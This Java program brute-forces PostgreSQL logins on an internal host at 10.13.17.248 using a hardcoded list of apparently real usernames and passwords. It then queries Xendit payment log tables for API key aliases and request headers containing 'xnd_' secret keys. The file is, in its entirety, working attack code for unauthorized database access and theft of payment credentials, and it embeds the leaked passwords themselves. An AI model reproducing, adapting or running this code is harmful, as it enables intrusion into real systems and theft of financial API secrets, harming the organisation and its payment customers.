import java.sql.*;
class DFT {
  public static void main(String[] a) throws Exception {
    Class.forName("org.postgresql.Driver");
    // Try Nucleus DB with ALL known passwords
    System.out.println("===TRY NUCLEUS DB===");
    String[][] creds = {
      {"venus","K6Yr4RV6jsBCjae4"},
      {"gemini","ufTP<=JGB^j;c8#"},
      {"nucleus","kutul0nc4t"},
      {"nucleus","canigonow"},
      {"nucleus","BJwx+sAC6jreaV45"},
      {"nucleus","K6Yr4RV6jsBCjae4"},
      {"accurate","BashShell%729#Acc5"},
      {"postgres","kutul0nc4t"},
      {"postgres","BJwx+sAC6jreaV45"}
    };
    for(String[] cr : creds) {
      try {
        Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/nucleus",cr[0],cr[1]);
        System.out.println("NUCLEUS OK! user="+cr[0]+" pass="+cr[1]);
        Statement s = c.createStatement();
        ResultSet r = s.executeQuery("SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY tablename");
        while(r.next()) System.out.println("  "+r.getString(1));
        c.close();
        break;
      } catch(Exception e) {}
    }
    // Query NEO xendit logs for request data containing keys
    System.out.println("===NEO XENDIT_QRIS_LOG===");
    Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/neo","neo","BJwx+sAC6jreaV45");
    Statement s = c.createStatement();
    ResultSet r = s.executeQuery("SELECT column_name FROM information_schema.columns WHERE table_name='xendit_qris_log' ORDER BY ordinal_position");
    while(r.next()) System.out.print(r.getString(1)+",");
    System.out.println();
    // Get sample with api_key_alias that we can map to full key
    r = s.executeQuery("SELECT DISTINCT api_key_alias FROM xendit_qris_log WHERE api_key_alias IS NOT NULL LIMIT 20");
    System.out.println("---UNIQUE-QRIS-ALIASES---");
    while(r.next()) System.out.println(r.getString(1));
    // Check xendit_link_payment_log for header_request with xnd_
    System.out.println("===LINK_PAYMENT_LOG===");
    r = s.executeQuery("SELECT id,header_request,api_key_alias FROM xendit_link_payment_log WHERE header_request IS NOT NULL AND header_request LIKE '%xnd_%' ORDER BY id DESC LIMIT 3");
    while(r.next()) System.out.println("ID="+r.getString(1)+"|HDR="+r.getString(2).substring(0,Math.min(300,r.getString(2).length()))+"|ALIAS="+r.getString(3));
    c.close();
  }
}
